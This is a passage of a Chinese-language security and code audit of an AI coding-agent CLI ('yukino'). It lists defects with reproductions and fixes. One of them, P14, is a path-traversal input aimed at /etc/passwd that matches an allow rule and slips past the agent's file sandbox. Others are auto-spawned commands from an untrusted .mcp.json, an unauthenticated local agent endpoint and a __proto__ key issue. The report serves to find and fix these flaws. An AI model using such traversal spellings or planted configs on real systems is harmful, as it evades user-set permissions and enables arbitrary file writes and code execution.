16384 KB → 941.2 ms （×4 体积 ⇒ ×4 耗时，线性）

````

- 定性：**真实缺陷（低危）**——16MB 级粘贴会同步阻塞事件循环约 1 秒（spinner/按键无响应），逐字符循环也非最优实现；但**不是 O(n²)**：V8 对 `slice(1)` 采用 SlicedString 表示，摊还 O(1)，不逐次复制剩余串（详见「更正」节）。
- 修复建议：pasting 状态下用 `indexOf(PASTE_END)` 做块级 slice，一次转发。

## 七、独立复核确认的缺陷（与 codex/yukino 报告相互印证；以下全部以本轮代码事实/实测为准）

### P14【高危｜安全】allow 规则短路 Layer 4 路径沙箱 + 规则匹配用原始未规范化路径 ⇒ 路径穿越可写任意文件（已实测）

- 位置：`src/permissions/index.ts:701-707`（Layer 4：`if (sandboxDecision && explicitEffect !== "allow")` —— 显式 allow 规则命中即**跳过** PathSandbox 的 canonicalPath 越界检查）、`:581`（`check()` 的规则匹配目标是 `extractContent` 返回的**原始** `file_path` 字符串）、`:230-244`（`globMatch` 的 `*` 编译为 `.*`，可匹配 `/` 与 `..`）。
- 实测（本轮独立复现）：用户对 `<proj>/src/foo.ts` 点「始终允许」（持久化 `EditFile(<proj>/src/*)`）后：

```text
file_path = "<proj>/src/../../../../etc/passwd"（原始穿越拼写）
    → allow | Permission rule: allow
    执行侧 path.resolve() 归一化后逃逸出 <proj>/src（落在沙箱根之外）
file_path = "/etc/passwd"（无穿越拼写）
    → ask   | Path /etc/passwd is outside allowed directories
````

同一越界目标，只要在原始字符串里带上 `..` 使其命中 allow 规则的 `src/*` 前缀，Layer 4 就被短路；而 EditFile/WriteFile 执行侧用 `resolveToolPath`（= `path.resolve`，不做 realpath）归一化后落盘，写入落到沙箱外。符号链接变体同理成立：`resolveToolPath` 不解析 symlink，`<proj>/src/link`（→ /etc）的原始路径同样命中 `src/*` 规则。

- 与 P6 的关系：P6 覆盖同一根因（规则匹配用原始文本、持久化用绝对路径）的**可用性面**（相对路径不命中）；本条覆盖**安全面**（穿越/符号链接拼写命中 allow 并短路沙箱）。两者应同一修复。
- 定性：**真实缺陷**（高危；与 yukino 报告 H-1 相互印证，本轮实测数据一致）。
- 修复建议：文件类 content 在规则匹配前统一做 `canonicalPath(resolveToolPath(cwd, content))` 归一化（持久化与匹配两侧同一归一化）；且 Layer 4 的越界检查不应被 allow 规则短路 —— 规则应只决定「是否询问」，不豁免「是否越界」。

### P15【中危｜稳定性】TUI 多处 fire-and-forget 无 .catch × /resume 路径多个同步抛点 × recover 把 unhandledRejection 升级为进程退出

- 抛点（均不在任何调用边界的 try/catch 内）：
  1. `src/session/index.ts:318` —— `loadTranscript` 的 `readFileSync` 在 `withFileSyncLock` 内但**不在**逐行 JSON 解析的 try/catch 内：文件不可读（EACCES/EISDIR）、跨进程锁 5s 超时（`teams/file-lock.ts` 抛 "timed out after 5000ms"）都会直接抛出；
  2. `src/todo/store.ts:73` —— `TaskStore.load()` 对损坏的 tasks.json 抛 "Cannot load an unreadable task list"（`/resume` 处理器 `ui/app.tsx:1944` 调 `useStore(new TaskStore(arg))`）；
  3. `src/file-history/index.ts:112` —— `FileHistory` 构造函数的 `withFileSyncLock` 同样可能锁超时抛出（`app.tsx:1950`）。
- 崩溃放大器：`src/recover.ts:137-148` —— `unhandledRejection` → 记录 → `process.exit(1)`。
- 触发路径（均无 `.catch`）：`src/ui/app.tsx:2908`（`--resume` 启动 effect）、`:3337`（resume 对话框 onSelect）、`:3285`（thinking 对话框）的 `void handleSlashCommand(…)`；`/resume` 分支自身（`:1885` 起）对 `loadSession`/`useStore`/`new FileHistory` 均无 try/catch。
- 影响：一个损坏或不可读的会话/任务文件即可让整个 TUI 崩溃退出（exit 1），而不是在界面上显示一条错误。
- 定性：**真实缺陷**（与 yukino 报告 M-5 相互印证；本轮**新识别** TaskStore 与 FileHistory 两个额外抛点）。
- 修复建议：所有 `void handleSlashCommand(…)` 挂 `.catch` 转为界面错误消息；`/resume` 分支对三个抛点包 try/catch。

### P16【中危｜安全/供应链】项目级 `.mcp.json` 无信任门禁，启动即自动 spawn 仓库内任意命令

- 位置：`src/config/index.ts`（`loadProjectMcpServers`/`withProjectMcpServers` 无条件读取并合并 `<cwd>/.mcp.json`；注释自认项目文件 "less trusted than the user's own config"，但仅用于重名优先级，未阻止自动执行）；入口全覆盖：`src/main.tsx`（UI 与 remote 模式）、`src/print-mode.ts:86`、`src/a2a/executor.ts:71`、`src/acp/agent.ts:91`、`src/remote/server.ts:2979`；执行侧 `src/mcp/client.ts:208`（`StdioClientTransport` 直接 spawn `command`+`args`，且继承完整 `process.env`）。
- 机制：克隆含恶意 `.mcp.json` 的仓库并在其中启动 yukino（TUI/`-p`/remote/ACP/A2A 全部命中），`command` 在用户机器上自动执行，全程无任何「是否信任本项目 MCP 服务器」的确认或持久化信任状态；README 记载了自动加载行为但未记载任何信任机制。
- 定性：**真实缺陷**（与 yukino 报告 H-2 相互印证；VS Code/Claude Code/Cursor 均对项目级 MCP/任务配置设信任门禁，属业界公认高危模式）。
- 修复建议：首次遇到新的项目级条目要求显式批准并持久化到 `~/.yukino/projects/<key>/`；`-p` 非交互模式默认不加载项目级 MCP（或要求显式旗标）。

### P17【中危｜安全】A2A 服务完全无鉴权（loopback-only 边界为设计意图）

- 位置：`src/a2a/server.ts:101,107`（JSON-RPC 与 REST 处理器均 `UserBuilder.noAuthentication`）、`src/a2a/card.ts`（`securitySchemes: {}`）；对照：remote 与 ACP-WS 均强制 `authorizeWebSocketRequest`（32B base64url token + 长度预检 + `timingSafeEqual` + Origin 校验，`src/websocket-security.ts`）。
- 机制：`--a2a` 强制 loopback 绑定（`server.ts:46-48` LOOPBACK_HOSTS 白名单，**此为设计意图**），但任何同机进程可无凭证 POST JSON-RPC 驱动完整 agent（读写文件、执行命令、消耗 API key），与产品自身另两个对外服务的 token 模型不一致。
- 定性：**鉴权缺失为真实缺陷；loopback 边界为设计意图**（与 yukino 报告 M-2 相互印证）。
- 修复建议：复用 `createWebSocketAccessToken` 为执行端点加 bearer token（agent card 可保持匿名）。

### P18【中低危｜安全】prompt_history.jsonl 以默认 umask（644）落盘，与本项目敏感文件 0600 标准不一致（已实测）

- 位置：`src/history/index.ts:66`（`writeFileSync(tempPath, lines, "utf-8")` 无 mode）；对照同项目：`config/provider-login.ts:89`（0o600）、`remote/server.ts:3123`（上传图片 0o600）、`conversation/user-bash.ts`（spill 0o600）、`tools/shell-background.ts openOutputFd`（0o600）。
- 实测（本机）：`~/.yukino/prompt_history.jsonl` → `-rw-r--r--`（452KB，含全部历史 prompt，可能含代码片段/路径/误粘贴的凭据）；`~/.yukino/config.yaml` → `-rw-------`。
- 定性：**真实缺陷**（与 yukino 报告 M-6 相互印证，本机实测确认）。
- 修复建议：统一 `mode: 0o600`；`~/.yukino` 目录 0700。

### P19【中危｜输入语义】Ctrl+J（及 legacy 协议 Shift+Enter）换行分支为死代码，「换行」实际直接提交消息

- 位置：`src/ui/input.tsx:586`、`src/ui/text-field.tsx:169-184` —— 换行分支条件 `hasReturn && (key.shift || (key.ctrl && input === "\n"))`。
- 验证（逐行核对 ink@7.1.1 `build/parse-keypress.js`）：
  - legacy 协议：`s === '\n'` 先命中 `key.name='enter'` 分支（:420-422），**ctrl 恒为 false**（ctrl+letter 分支 `s <= '\x1a'` 位于 else-if 链更后，`\n` 永远到不了）；
  - Kitty 协议：Ctrl+J 按 codepoint 106 解析 → `name='j', ctrl=true, text='j'`，`input === "\n"` 为 false。
  - 故 `key.ctrl && input === "\n"` 在两种键盘协议下**恒为 false**；legacy 协议下 Shift+Enter 与 Enter 发送相同字节、不可区分（终端固有限制），只有 Kitty 协议的 Shift+Enter 能进入换行分支。
- 影响：把 Ctrl+J 当换行键的终端按下后**直接提交半成品消息**给模型；死分支同时给维护者「已支持 Ctrl+J」的错觉，违反 AGENTS.md「积极删除死代码」。
- 定性：**真实缺陷**（与 yukino 报告 M-4 相互印证，ink 源码核对一致）。
- 修复建议：删除死分支，或基于 Kitty keyboard 能力查询实现修饰回车；文档说明 legacy 协议下 Ctrl+J 与 Enter 不可区分属终端固有限制。

### P20【低危｜功能】WebFetch 的 turndown 懒加载 Promise 缓存失败态

- 位置：`src/tools/web-fetch.ts:86` —— `turndownServicePromise ??= import("turndown").then(…)`：动态 import 一旦失败（依赖缺失/安装损坏），被拒绝的 Promise 被永久缓存，此后所有 HTML 抓取直到重启都失败。对照 `computer-use.ts getMacHelper` 在 catch 中重置 promise 才是正确模式。
- 定性：**真实缺陷**（低危；与 yukino 报告 L-2 相互印证）。

### P21【低危｜功能】WebFetch markdown 截断按 UTF-16 码元切割，可能切断代理对

- 位置：`src/tools/web-fetch.ts:123` —— `content.slice(0, MAX_MARKDOWN_LENGTH)`：emoji/CJK 扩展字符被切成孤立代理项，进入 API 请求后变替换字符。`shell-background.ts sliceUtf8Safe` 已有可复用的安全切割。
- 定性：**真实缺陷**（低危；与 yukino 报告 L-6 相互印证）。

### P22【低危｜功能】OSC-8 超链接 href 中字面 `+` 被替换为 `%20`

- 位置：`src/ui/marked-terminal.ts:377` —— `href.replace(/\+/g, "%20")`：意图是给空格编码，但 `+` 在 URL 中是合法字面字符（查询串 `?q=a+b`、base64url 路径等），替换后点击目标被改变（`%20` 解码为空格而非 `+`）。正确做法是只替换真实空格。
- 定性：**真实缺陷**（低危；与 yukino 报告 L-7 相互印证）。

### P23【低危｜健壮性】McpCall 的 coerceBySchema 对 `__proto__` 键方括号赋值触发原型替换

- 位置：`src/tools/mcp-call.ts:107` —— `out[key] = …`，`out` 为 `{}` 字面量：`JSON.parse` 产出的参数对象中 `__proto__` 是自有可枚举属性，赋值触发 `Object.prototype.__proto__` setter，把 `out` 的原型替换为该值（为对象时）。后果：发往 MCP server 的序列化结果丢失该键，且本地对象原型链被模型输入改写（仅影响该对象，不污染全局）。
- 定性：**真实缺陷**（低危；与 yukino 报告 S-2 相互印证，由「疑似」升级为代码事实确认）。
- 修复建议：`Object.create(null)` 或跳过 `__proto__`/`constructor`/`prototype` 键。

### P24【低危｜健壮性】VSCode WS transport `start()` 在纯 close（无 error）时可能永久挂起

- 位置：`src/vscode/ws-transport.ts:45-52` —— promise 只监听 `open`/`error`，未监听 `close`：socket 在 open 前被并发 `close()`（或纯关闭无 error）时 promise 永不 settle（依赖外部 abort 兜底）。
- 定性：**真实缺陷**（低危、触发窗口窄；与 yukino 报告 L-3 相互印证）。

### P25【低危｜副作用】WriteFile 在最终门禁拒绝前已创建父目录，留下空目录

- 位置：`src/tools/write-file.ts:105-117` —— `mkdir(dirname, {recursive:true})` 位于第二次 file-state 门禁**之前**：门禁拒绝覆盖已存在文件时，其父目录已被创建。
- 定性：**真实缺陷**（低危；与 yukino 报告 L-1 相互印证）。mkdir 应移到两道门禁都通过之后。

### P26【低危｜健壮性】ComputerUse Windows 截屏尺寸未做有限性校验，NaN 传播到 sharp.resize

- 位置：`src/tools/computer-use.ts:1395-1400` —— `split(",").map(Number)` 无 `Number.isFinite` 兜底；macOS 路径（:1362-1375）有。PowerShell 输出异常时 NaN 传入 resize，报错信息不友好（非崩溃，故低危）。
- 定性：**真实缺陷**（低危；与 yukino 报告 L-8 相互印证）。

### P27【低危｜交互】Ctrl+B 快捷键跨对话框双触发

- 位置：`src/ui/use-terminal-controls.ts:79-83`（全局 Ctrl+B 后台化前台 shell，仅靠「无前台任务时 no-op」收窄）× `src/ui/text-field.tsx:200`（TextField 的 Ctrl+B = 光标左移）：前台 shell 运行中打开含 TextField 的对话框（AskUser 的 Other、plan feedback 等）时，一次 Ctrl+B 同时移动光标并把任务转后台。代码注释显示作者已知绑定冲突，但只给 provider-login 做了门控。
- 定性：**真实缺陷**（低危；与 yukino 报告 L-4 相互印证）。

## 八、对其他报告结论的更正（以代码事实为准）

1. **yukino M-3「大文本粘贴逐字符转发导致事件循环 O(n²) 冻结（数秒至数十秒）」不成立。** 本轮实测（单 chunk bracketed-paste）：256KB→11ms、1MB→52ms、4MB→232ms、16MB→941ms，**线性扩展**。原因：V8 对 `String.prototype.slice` 采用 SlicedString 共享底层存储，逐字符 `slice(1)` 摊还 O(1)，不发生「每步复制整个剩余字符串」。真实问题降级收录为 P13（低危：16MB 粘贴同步阻塞约 1 秒，逐字符循环仍非最优）。
2. **yukino L-9「@引用展开失败时 UI 已显示用户消息但上下文未加入，transcript 与对话分歧」与代码不符，不收录。** `expandAtRefsWithImages` 对单个引用的失败（statSync/readFile/图片加载）全部在内层 try/catch 中吞掉并跳过（引用保留为字面文本），函数整体无抛出路径；`app.tsx runUserTurn` 中 `setMessages` 与 `addUserMessage` 不会因此分歧。
3. **yukino S-3「LSP diagnostics 等待上限 `Math.min(2000, timeout_ms)` 疑似应为 Math.max」判定为设计意图，不收录为缺陷。** 返回结构携带 `pending: !diagnostics` 标志（`tools/lsp.ts:259`），语义即「最多等 2 秒，未就绪则标记 pending 返回」，与 pending 协议配套，非笔误。

## 九、本轮新增确认的设计意图（非缺陷）

1. **A2A/ACP-WS 强制 loopback 绑定**（`a2a/server.ts:46-48`、`acp/websocket.ts:36-38` 的 LOOPBACK_HOSTS 白名单）：显式设计（鉴权缺失面另列 P17）。
2. **AGENTS.md 的 `@include` 支持任意绝对路径**（`memory/instructions.ts`）：指令文件是用户自己的受信内容，仅注入上下文、不执行；且有 seen 集合环检测、深度上限 5、代码围栏内跳过。
3. **Coordinator 模式白名单不含 ReadFile/Glob/Grep/Bash**（`teams/coordinator.ts`）：注释详细论证「Leader 上下文必须留给编排」；配置全程权威、不中途切换，避免历史指令无法撤回。
4. **MCP 三模式加载（eager/native/dispatch）**（`mcp/strategy.ts`）：注释给出 prompt-cache 实测依据（tools 尾部追加一个工具使缓存命中 99.4%→9.5%）；native 仅限 Anthropic 官方端点，环境变量 override 也带协议防护（非 anthropic 协议下 native 降级 dispatch）。
5. **review filter「解析失败 = 全部批准」**（`review/filter.ts parseFilterResponse`）：无法理解的过滤器绝不允许静默销毁发现，保守方向正确。
6. **`buildDiff` 用前后缀公共行扫描替代 LCS/Myers**（`tools/diff.ts`）：注释说明编辑场景是小范围中段修改，性能与简洁性权衡；MAX_DIFF_LINES 截断带提示。
7. **skills executor `runFork` 内层 `const context` 遮蔽外层同名参数**（`skills/executor.ts:67`）：块级作用域，return 处引用的是外层 ToolContext 参数，行为正确；仅可读性问题，不计缺陷。
8. **review/git.ts 合成 untracked diff 时 CRLF 内容的 `\r` 被 `splitDiffLines` 统一剥除**：对所有行一致处理，仅影响 review 展示层，不构成缺陷。
9. **TaskManager `nextTaskId` 模块级全局计数器 + 恢复时按存量记录抬升**（`subagent/task-manager.ts:14,88-91`）：task-store 的 TaskId schema（`^[\w-]+-[1-9]\d*$`）保证数字后缀必可解析，无 NaN 风险。
10. **print 模式只等待 agent 类后台任务、shell 类直接杀**（`print-mode.ts` 注释 + `waitAll` filter）：dev server 类命令会永久挂起 `-p`，属显式取舍。

## 十、本轮检查过且确认健壮的部分（新增抽样）

- **review 全链路**：diff-parser（git C-style 路径反引号解码含八进制转义、quoted/unquoted 头解析、rename from/to 权威路径、`@@` 行号、binary/new/deleted 分支）、git.ts（`ls-files -z` NUL 分隔防换行文件名、`--end-of-options` 防 ref 注入、merge-base/first-parent、空仓库 staged 回退、8000 字节 NUL 嗅探二进制）、resolve/relocate（hunk 新侧→旧侧→全文→跨文件→LLM 五级定位，零/多命中均拒绝猜测，probe 用副本防污染）、selection/grouping（token 预算派生自 provider 窗口、组上限、解析失败确定性分块回退）、runner（每组独立 collector 防跨组索引腐蚀、worker 池 abort 检查、失败组已收集发现保留、utilClient 与 per-group client 隔离 max-output 升级副作用）。
- **todo/teams**：TaskStore（zod 校验 + ID 计数器一致性检查 + tmp/rename 原子写）、TaskList（structuredClone 隔离、依赖环 DFS 检测、双向链接一致性校验）、file-mailbox（read 标记、500 条已读上限、未读永不丢、requeue 语义）、file-lock（bakery 算法复核：choosing/ticket 两阶段、陈旧条目仅在属主进程死亡时回收、token 保护释放、递归获取检测、5s 上限）。
- **a2a/executor**：idle 驱逐与 in-flight 保护（disarm/arm timer、evictSession 不驱逐活跃 run、驱逐后凭 sessionId 透明重建）、permission-response 的 taskId 校验、settle/done 双 deferred 时序、reject 不污染在飞任务持久态。
- **acp/agent**：session generation 计数防串话、tail 串行队列、cancel/close/dispose 全路径 abort、权限请求 `Promise.race` 取消（race 已订阅两侧，无 unhandled rejection）、cwd 不匹配拒绝。
- **agent 主循环与 StreamingExecutor（重读）**：wake 机制单线程交错分析无丢失唤醒；max_tokens 升级/恢复计数与零输出重放；abort 各路径保存部分输出；tool_use↔tool_result 在 interrupted/deny/parseError/toolFilter 拒绝下均配对；spill 读回豁免防循环。
- **compact（重读）**：keep-walk 上下界、backUpPastToolUse 保配对、PTL 按 API-round 分组头部截断重试、压缩期间会话变更检测（引用相等）、熔断器与 hard-block 强制路径、cache-sharing 摘要调用。
- **llm**：anthropic `message_stop` 终态守卫、usage 字段独立应用、cache 断点避开 defer_loading 工具、thinking budget 的 answerReserve 下限；openai Responses/Chat 双协议转换（computer_call 双向映射含 safety checks、reasoning item 还原、tool-call start 守卫、incomplete_details 区分 max_output_tokens/content_filter）、错误分类（413/400+context-length/401/429/5xx/408）与 Retry-After 双格式。
- **execution-coordinator**：workspace mutation 队列（canonicalPath 键、abort 取消、释放链、后台化即释放锁）、锁后权限复查（approvedPermissionMode 变化时重新 ask）。
- **bash/powershell**：fd-mode stdio（孙进程不扣住结果）、进程组 kill + pid 复用守卫、5GB 看门狗、后台化状态机（terminating/settled/backgrounded 互斥）、exit-cleanup 注册/反注册、PowerShell 与 Bash 完全对等。
- **feedback**：redact 多层（键名 camelCase 归一化、URL 凭据/敏感查询参数剥离、已知 token 前缀、Bearer、已知秘密值替换、YAML 块值）、zip（本地 CRC32 表实现、DOS 时间、UTF-8 名标志位）、analyze（预算派生自真实窗口、截断/非法 JSON 双路重试、description 兜底）、collect（尾部封顶读取、二进制嗅探、tool-trace 逆序截断）、gist 空内容 JSON 封装（本轮最新提交 3b1f5e5 复核无回归）。
- **update/install**：execFile/spawn 全数组参数、PowerShell 单引号转义、全局安装归属检查（realpath + isInside）、固定 npm registry、版本 semver 严格校验（含 prerelease 规则，复核无误）。
- **images**：magic-byte 嗅探不信扩展名、5MB base64 上限、50MB 磁盘准入、sharp 缩放、剪贴板三平台（osascript/wl-paste+xclip/PowerShell STA）+ 超时 + 字节上限 + PNG 签名校验。
- **logger**：Proxy 转发保证 pre-init 安全、fd 泄漏防护（re-init 先 close）、err serializer 递归 cause 限深 5 且永不抛、日志清理 30 天 mtime、multistream 显式 level。
- **storage/paths**：sessionId/listId/memberName 白名单正则、projectKey = sha256(canonicalPath)、canonicalPath 逐级 realpath 回退（含 ENOTDIR）、isPathWithin 用 relative 判定。
- **websocket-security**：32B base64url token、长度预检 + timingSafeEqual、Origin http+host 精确匹配、404/401/403 分层拒绝。
- **cli/print-mode/main**：单一语法所有者、`-p -- <prompt>` 分隔符、server 模式互斥矩阵、入口 realpath 判定防库导入副作用；print 模式 SIGINT/SIGTERM → exitCode+abort+stopAll、finally 全量清理；main 各模式 telemetry 初始化/关闭配对、UI 模式终端状态恢复。
- **skills**：安装 1MiB 上限（content-length 预检 + 流式累计双保险）、SSRF 加固下载（fetchPublicHttpUrl）、安装路径逐级拒绝符号链接（含悬空链接）、临时文件 wx + rename、热重载 mtime 判定 + 解析失败保留缓存、frontmatter 重命名触发全量 reload。
- **memory**：extractor（inProgress+pendingContext 合并、文本协议回退解析、名称白名单正则防路径注入、写前 MemoryPermissionChecker 复核）、consolidation（时间/会话双闸门 + 10 分钟扫描节流 + 跨进程锁 + 失败不更新时间戳）、instructions（@include 环检测/深度上限/代码围栏跳过）。
- **hooks**：once 槽位执行前认领、失败释放重试；async 钩子错误按 on_error 语义转通知；reject×async 互斥校验；agent 类型配置直接拒绝（无宿主注册 runner）。
- **file-history**：单调备份名计数器防剪枝后复用覆盖、baseline 三态（existing/absent/unavailable）、rewind 后快照截断 + 备份清理、瞬态失败保留重试能力、跨进程锁下 load-modify-save。
- **worktree**：SAFE_REF_RE + `..`/前导 `-`/`/` 拒绝、纯文件系统 HEAD 读取（loose→packed-refs 回退、symref 环检测限深 64）、复用前 `rev-parse --show-toplevel` 验证、`worktree remove`/`branch -d` 保守删除、`.worktreeinclude` 的 `..` 防护、husky hooksPath 仅 worktree 级配置。
- **remote server（关键路径）**：入站消息全 zod 校验、streaming 槽位同步抢占防双 agent、权限/提问请求 5 分钟超时自动 deny/空答、图片上传 32MB 上限 + magic-byte 嗅探 + 0600 + 名称消毒、serveStatic normalize + 前缀剥离 + 目录前缀校验、resume/rewind 与终端语义对齐（sessionLineCount 权威坐标）。

## 十一、更新后的总结表

| 编号   | 结论                                               | 严重度 | 定性             | 与其他报告关系                                       |
| ------ | -------------------------------------------------- | ------ | ---------------- | ---------------------------------------------------- |
| P1–P10 | （见上文第一~四节）                                | —      | 本轮全部复核成立 | P1–P3/P6/P7/P9/P10 与 codex 印证；P4/P5 为 pi 首报   |
| P11    | cancelled 阻塞者永久卡死依赖任务，链接无法解除     | 中低   | 真实缺陷         | **新发现**（已实测）                                 |
| P12    | @引用紧邻标点不展开，上下文静默丢失                | 低     | 真实缺陷         | **新发现**（已实测）                                 |
| P13    | 大粘贴同步阻塞事件循环（线性，16MB≈1s）            | 低     | 真实缺陷         | **更正** yukino M-3（O(n²) 不成立）                  |
| P14    | allow 规则短路沙箱 + 原始路径匹配 → 穿越写任意文件 | 高     | 真实缺陷         | 印证 yukino H-1（补 P6 的安全面，已实测）            |
| P15    | fire-and-forget × resume 多抛点 × exit(1) 放大器   | 中     | 真实缺陷         | 印证 yukino M-5（新识别 TaskStore/FileHistory 抛点） |
| P16    | 项目级 .mcp.json 无信任门禁（供应链 RCE）          | 中     | 真实缺陷         | 印证 yukino H-2                                      |
| P17    | A2A 服务无鉴权（loopback 为设计）                  | 中     | 真实缺陷         | 印证 yukino M-2                                      |
| P18    | prompt_history.jsonl 644 落盘                      | 中低   | 真实缺陷         | 印证 yukino M-6（本机实测）                          |
| P19    | Ctrl+J 换行分支死代码，实际直接提交                | 中     | 真实缺陷         | 印证 yukino M-4（ink 源码核对）                      |
| P20    | WebFetch turndown 失败态永久缓存                   | 低     | 真实缺陷         | 印证 yukino L-2                                      |
| P21    | WebFetch 截断按 UTF-16 切割代理对                  | 低     | 真实缺陷         | 印证 yukino L-6                                      |
| P22    | OSC-8 href 字面 `+` → `%20`                        | 低     | 真实缺陷         | 印证 yukino L-7                                      |
| P23    | coerceBySchema `__proto__` 原型替换                | 低     | 真实缺陷         | 印证 yukino S-2（升级为确认）                        |
| P24    | VSCode WS transport start() 纯 close 挂起          | 低     | 真实缺陷         | 印证 yukino L-3                                      |
| P25    | WriteFile mkdir 先于最终门禁                       | 低     | 真实缺陷         | 印证 yukino L-1                                      |
| P26    | ComputerUse Windows 尺寸 NaN 无兜底                | 低     | 真实缺陷         | 印证 yukino L-8                                      |
| P27    | Ctrl+B 跨对话框双触发                              | 低     | 真实缺陷         | 印证 yukino L-4                                      |
| 更正-1 | 粘贴 O(n²) 冻结论断不成立（实为线性）              | —      | 更正             | yukino M-3                                           |
| 更正-2 | @引用失败致 transcript 分歧与代码不符              | —      | 更正（不收录）   | yukino L-9                                           |
| 更正-3 | LSP 2s 上限为 pending 协议配套语义                 | —      | 设计意图         | yukino S-3                                           |

修复优先级建议（本轮增量，与既有第四节合并考虑）：

- **P0**：P14（与 P6 同一根因修复：规则匹配路径归一化 + Layer 4 不被 allow 短路）、P16（.mcp.json 信任门禁）、P1（既有：子命令切分推广到全模式）。
- **P1**：P15（fire-and-forget 挂 catch + resume 边界捕获）、P11（cancelled 解除阻塞）、P17（A2A token）、P18（0600）、P2（既有）。
- **P2**：P19（删除/实现死分支）、P13（paste 块级切割）、P12（@引用尾随标点剥离）、P3/P4/P5（既有）。
- **P3**：P20–P27 与既有 P7–P10 按余力处理。

本轮验证环境：macOS（seatbelt 实测）、Node v24.16.0、`pnpm test` 156 文件 / 2410 passed / 1 skipped（88.34s，本轮复跑）。所有标注「实测」的数据均在本机复现；验证脚本已清理，测试期间写入 `~/.yukino/projects/*` 的临时规则文件与 `~/.yukino/worktrees/abc123` 测试目录均已删除。

---

# 第四轮探索补充（聚焦前三轮未精读模块，全部以代码事实/实测为准）

- 探索日期：2026-10-18（第四轮）
- 方法：按「以代码事实为准」的要求，本轮重点精读前三轮**未逐行覆盖**的模块：`remote/address`、`remote/log`、`remote/session-state`、`remote/browser`（use-chat/use-web-socket/markdown）、`goal`、`plan-file`、`tool-result`、`conversation/pairing`、`utils`（file-scan/paths/slug/index）、`config`（index/provider-config/provider-login）、`commands`（commands/loader/usage-tracker）、`bootstrap`（tool-registry/sandbox/exit-cleanup）、`prompt`（builder/sections）、`mcp`（manager/instructions/tool-wrapper）、`memory`（manager/memory-age/written-paths/permissions）、`skills`（catalog/executor/load-skill-tool）、`teams`（index/tools/protocol/progress/team-file/task-stop）、`subagent`（spawn/tool-filter/agent-tool）、`review`（comment-tool/format/form/report/llm-call/file-read-diff）、`feedback`（dedup/github）、`update/version-check`、`vscode`（lockfile/ide-client）、`a2a/conversion`、`acp`（conversion/stdio）、`telemetry/instrumentation`、`llm`（model-discovery/retry/errors）、`tools`（read-file/glob/grep/lsp/web-fetch/ask-user/goal/exit-plan-mode/exit-worktree/enter-plan-mode/synthetic-output/task-output/tool-search/exit-code-hints/edit-file-diagnostics/search-output/shell-output/registry/snippets）、`session/index`、`file-history/index`、`history/index`、`recover`、`index`（barrel）、以及 `ui` 的渲染/对话框/布局层（marked-terminal/markdown/syntax-highlight/table-layout/terminal-text/terminal-output/terminal-theme/streaming-markdown/chat/diff-render/tool-display/tool-preview/footer/spinner/list-window/selector-search/selector-list/input-navigation/input-draft/input-paste/interrupt-scope/use-agent-output/use-user-bash/use-follow-up-queue/use-terminal-layout/ask-user-dialog/permission-dialog/plan-approval/rewind-dialog/session-selector/model-select/agent-tool-progress/text-field）与 `remote/server.ts`、`ui/input.tsx`、`ui/app.tsx` 的关键分支。
- 基线复核（本轮实测）：`pnpm typecheck` 通过（exit 0）；`pnpm test` → **156 个测试文件 / 2410 passed / 1 skipped**（65.67s，exit 0）。
- 总体结论：代码库工程质量极高，本轮**未发现新的高/中危缺陷**。前三轮 P1–P27 经抽样复核仍成立（本轮未重复验证，仅在与新发现相关处交叉引用）。以下 3 条为本轮新发现，均为**低危/极低危**，逐条给出代码事实与定性。

## 十二、本轮新发现的真实缺陷（均为低危/极低危）

### P28【极低危｜文档/行为不一致】`parseRemoteAddress` 的注释把 `":"` 列为合法「空主机」输入，但实现直接抛错（已实测）

- 位置：`src/remote/address.ts`
  - `ParseRemoteAddressOptions.defaultPort` 的注释（:3-8）明确写道：「Port used when the address omits it (a bare host like "localhost" or **an empty host like ":"**)」——即声明 `":"` 是「省略端口的空主机」合法形态，应落到 `defaultPort`；
  - 实现的正则 `^(?:\[([^\]]+)\]|([^:]*))(?::(\d+))?$`（:33）：对 `":"`，`[^:]*` 只能匹配空串，随后 `(?::(\d+))?` 无法匹配孤立的 `":"`（缺少数字），整串匹配失败 → 落入 `throw new Error("Invalid remote address…")`。
- 实测（本轮独立复现，`defaultPort: 1234`）：

  | 输入           | 结果                                                       |
  | -------------- | ---------------------------------------------------------- |
  | `""`（空串）   | `{host:"127.0.0.1", port:1234}`（正常，空主机 + 默认端口） |
  | `"localhost"`  | `{host:"localhost", port:1234}`（正常）                    |
  | `":9000"`      | `{host:"127.0.0.1", port:9000}`（正常，空主机 + 显式端口） |
  | `":"`          | **THROW: Invalid remote address**（与注释声明矛盾）        |
  | `"localhost:"` | THROW（尾随冒号无端口，可接受）                            |

- 影响：极小。`":"` 是非常规输入；真正「空主机 + 默认端口」的可用形态是空串 `""`（实测正常）或各 server 模式的 `DEFAULT_ADDRESS`。README 也只演示 `--remote 9000` / `--remote 0.0.0.0:9000` / `--remote 0`，未把 `":"` 作为对外承诺。危害仅在于**注释误导维护者**（让人以为 `":"` 受支持），以及用户若手输 `":"` 会得到「Invalid remote address」而非「使用默认端口」。
- 定性：**真实缺陷（极低危，文档/行为不一致）**。注释与实现二者必有一处错误：要么修正注释（删去 `":"` 示例，改以空串 `""` 说明「空主机」），要么放宽正则让 `":"` 等价于空串（`host` 空 + `port` 缺省）。鉴于 `":9000"` 已支持、`""` 已支持，让 `":"` 也落到默认端口在语义上更自洽。
- 修复建议：将正则的端口分组改为可匹配「冒号后为空」，例如 `^(?:\[([^\]]+)\]|([^:]*))(?::(\d*))?$`，并在 `portText === ""` 时按「省略端口」处理（落到 `defaultPort`）；或仅修正注释。

### P29【极低危｜交互一致性】历史召回（↑/↓）对多行条目把光标置于**首行行尾**，与「召回排队消息」置于**末行行尾**不一致

- 位置：`src/ui/input.tsx`
  - ↑ 历史召回（:817-824）与 ↓ 历史回退（:838-846）在 `setLines(entryLines)` 后统一执行 `setCursorLine(0); setCursorCol(entryLines[0].length);`——光标落在**第 0 行行尾**；
  - 对照「召回最近一条排队消息」分支（:783-800，`onRecallQueuedMessage`）：`setCursorLine(recalledLines.length - 1); setCursorCol(recalledLines[recalledLines.length - 1].length);`——光标落在**末行行尾**。
- 机制：两条「把一段多行文本塞回编辑器」的路径对光标落点取了不同约定。单行条目（历史的绝大多数）下二者等价（首行即末行）；**多行条目**下历史召回把光标停在首行行尾，用户若想接着末尾继续输入需手动 ↓ 到最后一行，与排队消息召回的体验不一致。
- 影响：极小，纯交互体验，无功能/数据风险；且 `history` 中的多行条目本身少见（命令多为单行）。
- 定性：**真实缺陷（极低危，一致性）**。两处约定应统一；从「召回后通常在末尾继续编辑」的直觉看，末行行尾是更合理的落点。
